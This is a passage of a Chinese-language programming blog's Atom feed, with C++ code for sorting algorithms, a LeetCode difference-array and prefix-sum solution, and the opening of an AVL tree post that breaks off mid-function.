nums[j];</span><br><span class="line">&#125;</span><br><span class="line">nums[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 折半插入</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">halfInsertSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> temp = nums[i];</span><br><span class="line"><span class="comment">// 折半查找[0, i - 1]</span></span><br><span class="line">        <span class="comment">// 闭区间二分</span></span><br><span class="line"><span class="type">int</span> l = <span class="number">0</span>, r = i - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (l &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> m = l + (r - l) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (nums[m] &lt; temp)</span><br><span class="line">&#123;</span><br><span class="line">l = m + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">r = m - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [l, i - 1]元素后移</span></span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= l; j--)</span><br><span class="line">nums[j + <span class="number">1</span>] = nums[j];</span><br><span class="line"><span class="comment">// 插入指定位置</span></span><br><span class="line">nums[l] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 冒泡排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 记录当前遍历是否发生过交换</span></span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">// 每次将未排序的数中最小的数推到前面</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt; i; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (nums[j] &lt; nums[j - <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = nums[j];</span><br><span class="line">nums[j] = nums[j - <span class="number">1</span>];</span><br><span class="line">nums[j - <span class="number">1</span>] = t;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果没有发生交换，说明已经有序了</span></span><br><span class="line"><span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quickSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> start, <span class="type">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (start &gt;= end)<span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 将第一个数作为基准值</span></span><br><span class="line"><span class="type">int</span> t = nums[start];</span><br><span class="line"><span class="type">int</span> i = start, j = end;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; nums[j] &gt;= t)</span><br><span class="line">&#123;</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">nums[i] = nums[j];</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; nums[i] &lt;= t)</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">nums[j] = nums[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 最后把基准值放在最后剩下的位置</span></span><br><span class="line">nums[i] = t;</span><br><span class="line"><span class="comment">// 并分为两部分</span></span><br><span class="line"><span class="comment">// i 左边的都更小，右边的都更大</span></span><br><span class="line"><span class="built_in">quickSort</span>(nums, start, i - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">quickSort</span>(nums, i + <span class="number">1</span>, end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">selectSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (nums[i] &gt; nums[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = nums[i];</span><br><span class="line">nums[i] = nums[j];</span><br><span class="line">nums[j] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mergeSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (left &gt;= right)<span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 递归拆分</span></span><br><span class="line"><span class="built_in">mergeSort</span>(nums, left, mid);</span><br><span class="line"><span class="built_in">mergeSort</span>(nums, mid + <span class="number">1</span>, right);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="comment">// 先将数组元素放到辅助数组中去</span></span><br><span class="line"><span class="keyword">for</span> (k = left; k &lt;= right; k++)</span><br><span class="line">&#123;</span><br><span class="line">a[k] = nums[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = left, j = mid + <span class="number">1</span>, k = i; i &lt;= mid &amp;&amp; j &lt;= right; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果左边的小就放左边的</span></span><br><span class="line"><span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">&#123;</span><br><span class="line">nums[k] = a[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则放右边的</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">nums[k] = a[j++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当有一个完成了就跳出，把另一个序列的剩下所有元素放进去</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid)nums[k++] = a[i++];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= right)nums[k++] = a[j++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 堆调整</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heapUpdate</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> start, <span class="type">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> dad = start;</span><br><span class="line"><span class="type">int</span> son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (son &lt;= end)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (son + <span class="number">1</span> &lt;= end &amp;&amp; nums[son] &lt; nums[son + <span class="number">1</span>])son++;</span><br><span class="line"><span class="keyword">if</span> (nums[dad] &gt; nums[son])<span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">swap</span>(&amp;nums[dad], &amp;nums[son]);</span><br><span class="line">dad = son;</span><br><span class="line">son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heapSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 更新以i为根的子树</span></span><br><span class="line"><span class="built_in">heapUpdate</span>(nums, i, n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">swap</span>(&amp;nums[<span class="number">0</span>], &amp;nums[i]);</span><br><span class="line"><span class="built_in">heapUpdate</span>(nums, <span class="number">0</span>, i - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;排序算法&quot;&gt;&lt;a href=&quot;#排序算法&quot; class=&quot;headerlink&quot; title=&quot;排序算法&quot;&gt;&lt;/a&gt;排序算法&lt;/h1&gt;&lt;h2 id=&quot;插入排序&quot;&gt;&lt;a href=&quot;#插入排序&quot; class=&quot;headerlink&quot; title=&quot;插入排序&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="排序" scheme="https://1xueyu1.github.io/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>差分数组</title>
    <link href="https://1xueyu1.github.io/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"/>
    <id>https://1xueyu1.github.io/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/</id>
    <published>2023-12-17T11:33:22.000Z</published>
    <updated>2023-12-25T16:12:25.116Z</updated>
    
    <content type="html"><![CDATA[<h1 id="差分数组"><a href="#差分数组" class="headerlink" title="差分数组"></a>差分数组</h1><h2 id="一维差分数组"><a href="#一维差分数组" class="headerlink" title="一维差分数组"></a>一维差分数组</h2><p><a href="https://leetcode.cn/problems/car-pooling/solutions/2550264/suan-fa-xiao-ke-tang-chai-fen-shu-zu-fu-9d4ra/">1094. 拼车 - 力扣（LeetCode）</a></p><h3 id="定义和性质"><a href="#定义和性质" class="headerlink" title="定义和性质"></a>定义和性质</h3><p><img src="/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/image-20231217193954494.png" alt="image-20231217193954494"></p><h2 id="二维前缀和"><a href="#二维前缀和" class="headerlink" title="二维前缀和"></a>二维前缀和</h2><p><a href="https://leetcode.cn/problems/stamping-the-grid/solutions/1199642/wu-nao-zuo-fa-er-wei-qian-zhui-he-er-wei-zwiu/?envType=daily-question&envId=2023-12-14">2132. 用邮票贴满网格图 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/circle/discuss/UUuRex/">【图解】二维前缀和（附模板代码 Python&#x2F;Java&#x2F;C++&#x2F;Go&#x2F;JS） - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">possibleToStamp</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> stampHeight, <span class="type">int</span> stampWidth)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.二维前缀和数组</span></span><br><span class="line">        <span class="comment">// s[i][j] 代表前 i 行每行的前 j 个元素的和</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">s</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 可以先想一下，或者可以看上面的链接</span></span><br><span class="line">                s[i][j] = s[i][j - <span class="number">1</span>] + s[i - <span class="number">1</span>][j] - s[i - <span class="number">1</span>][j - <span class="number">1</span>] + grid[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用一个二维数组记录满足的情况， 如果这一块满足情况，就将里面的元素全部加1</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">d</span>(m + <span class="number">2</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n + <span class="number">2</span>));</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i2 = stampHeight; i2 &lt;= m; i2++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j2 = stampWidth; j2 &lt;= n; j2++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> i1 = i2 - stampHeight + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> j1 = j2 - stampWidth + <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果这一片的面积为0说明是满足情况的</span></span><br><span class="line">                <span class="keyword">if</span>(s[i2][j2] - s[i2][j1 - <span class="number">1</span>] - s[i1 - <span class="number">1</span>][j2] + s[i1 - <span class="number">1</span>][j1 - <span class="number">1</span>] == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    d[i1][j1]++;</span><br><span class="line">                    d[i1][j2 + <span class="number">1</span>]--;</span><br><span class="line">                    d[i2 + <span class="number">1</span>][j1]--;</span><br><span class="line">                    d[i2 + <span class="number">1</span>][j2 + <span class="number">1</span>]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.还原二维差分数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                d[i + <span class="number">1</span>][j + <span class="number">1</span>] += d[i + <span class="number">1</span>][j] + d[i][j + <span class="number">1</span>] - d[i][j];</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="number">0</span> &amp;&amp; d[i + <span class="number">1</span>][j + <span class="number">1</span>] == <span class="number">0</span>)<span class="comment">// 这说明这个格子没有情况是满足的</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;差分数组&quot;&gt;&lt;a href=&quot;#差分数组&quot; class=&quot;headerlink&quot; title=&quot;差分数组&quot;&gt;&lt;/a&gt;差分数组&lt;/h1&gt;&lt;h2 id=&quot;一维差分数组&quot;&gt;&lt;a href=&quot;#一维差分数组&quot; class=&quot;headerlink&quot; title=&quot;一维差分数</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="skill" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/skill/"/>
    
    
    <category term="差分数组" scheme="https://1xueyu1.github.io/tags/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>AVL树</title>
    <link href="https://1xueyu1.github.io/2023/12/12/AVL%E6%A0%91/"/>
    <id>https://1xueyu1.github.io/2023/12/12/AVL%E6%A0%91/</id>
    <published>2023-12-12T11:54:33.000Z</published>
    <updated>2023-12-12T12:41:09.502Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h1><p><a href="https://zhuanlan.zhihu.com/p/56066942">什么是平衡二叉树（AVL） - 知乎 (zhihu.com)</a></p><p>AVL树又称<strong>平衡二叉搜索树</strong></p><h2 id="平衡因子"><a href="#平衡因子" class="headerlink" title="平衡因子"></a>平衡因子</h2><p>定义：某节点的左子树与右子树的高度(深度)差即为该节点的平衡因子（BF,Balance Factor），平衡二叉树中不存在平衡因子大于 1 的节点。在一棵平衡二叉树中，节点的平衡因子只能取 0 、1 或者 -1 ，分别对应着左右子树等高，左子树比较高，右子树比较高。 </p><h2 id="节点定义"><a href="#节点定义" class="headerlink" title="节点定义"></a>节点定义</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">AVLNode</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> depth; </span><br><span class="line">Tree parent; <span class="comment">//父节点</span></span><br><span class="line">ElementType val;</span><br><span class="line">Tree l, r;</span><br><span class="line"></span><br><span class="line"><span class="built_in">AVLNode</span>(<span class="type">int</span> val = <span class="number">0</span>)</span><br><span class="line">: <span class="built_in">parent</span>(<span class="literal">nullptr</span>)</span><br><span class="line">, <span class="built_in">depth</span>(<span class="number">0</span>)</span><br><span class="line">, <span class="built_in">l</span>(<span class="literal">nullptr</span>)</span><br><span class="line">, <span class="built_in">r</span>(<span class="literal">nullptr</span>)</span><br><span class="line">, <span class="built_in">val</span>(val)</span><br><span class="line">&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="用到的函数"><a href="#用到的函数" class="headerlink" title="用到的函数"></a>用到的函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更新当前深度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update_depth</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> depth_Lchild=<span class="built_in">get_balance</span>(node-&gt;lchild); <span class="comment">//左孩子深度</span></span><br><span class="line">        <span class="type">int</span> depth_Rchild=<span class="built_in">get_balance</span>(node-&gt;rchild); <span class="comment">//右孩子深度</span></span><br><span class="line">        node-&gt;depth=<span class="built_in">max</span>(depth_Lchild,depth_Rchild)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前结点的深度</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_balance</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node==<span class="literal">NULL</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;depth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回当前平衡因子</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">is_balance</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node==<span class="literal">NULL</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">get_balance</span>(node-&gt;lchild)-<span class="built_in">get_balance</span>(node-&gt;rchild); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四种旋转方式"><a href="#四种旋转方式" class="headerlink" title="四种旋转方式"></a>四种旋转方式</h2><h3 id="RR型"><a href="#RR型" class="headerlink" title="RR型"></a>RR型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RR型调整函数</span></span><br><span class="line"><span class="comment">//返回新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">RR_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="comment">//node为离操作结点最近的失衡的结点</span></span><br><span class="line">    